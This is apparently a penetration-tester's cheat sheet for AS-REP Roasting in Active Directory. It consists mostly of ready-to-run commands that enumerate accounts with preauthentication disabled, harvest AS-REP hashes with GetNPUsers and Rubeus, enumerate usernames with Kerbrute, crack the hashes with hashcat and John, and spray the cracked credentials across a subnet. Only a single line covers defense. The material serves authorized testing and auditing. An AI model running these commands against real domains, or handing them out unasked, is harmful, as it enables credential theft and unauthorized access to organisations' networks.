# AS-REP Roasting

Accounts with "Do not require Kerberos preauthentication" enabled respond to AS-REQ without needing a password. The AS-REP contains encrypted data you can crack offline.

## Enumerate Vulnerable Accounts

**BloodHound:** Run "Find AS-REP Roastable Users" query — shows accounts immediately.

**From Linux (without creds — if you have a username list):**
```bash
GetNPUsers.py domain.local/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
# No password needed — just usernames
```

**From Linux (with creds — enumerates automatically):**
```bash
GetNPUsers.py domain.local/user:pass -dc-ip DC_IP -request -format hashcat -outputfile asrep_hashes.txt
```

**From Windows (Rubeus):**
```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
.\Rubeus.exe asreproast /user:vulnerable_user /format:hashcat
```

**From Windows (PowerView — enumerate only):**
```powershell
Get-DomainUser -PreauthNotRequired
```

## Build Username List for Unauthenticated Attack

```bash
# Kerbrute username enumeration (no creds needed)
kerbrute userenum -d domain.local --dc DC_IP /usr/share/wordlists/usernames.txt
# Valid usernames can then be fed to GetNPUsers
```

## Crack the Hashes

```bash
# AS-REP hash type is 18200
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John
john asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## After Cracking

```bash
# Verify and test access
nxc smb DC_IP -u cracked_user -p 'CrackedPass'
nxc smb 192.168.1.0/24 -u cracked_user -p 'CrackedPass'
bloodhound-python -u cracked_user -p 'CrackedPass' -d domain.local -c All -ns DC_IP
```

**Defense:** Require Kerberos preauthentication for all accounts. Audit quarterly with BloodHound "Find AS-REP Roastable Users" query.

**Key difference from Kerberoasting:** AS-REP Roasting needs no existing valid credentials — just a username list. High value in black-box scenarios.
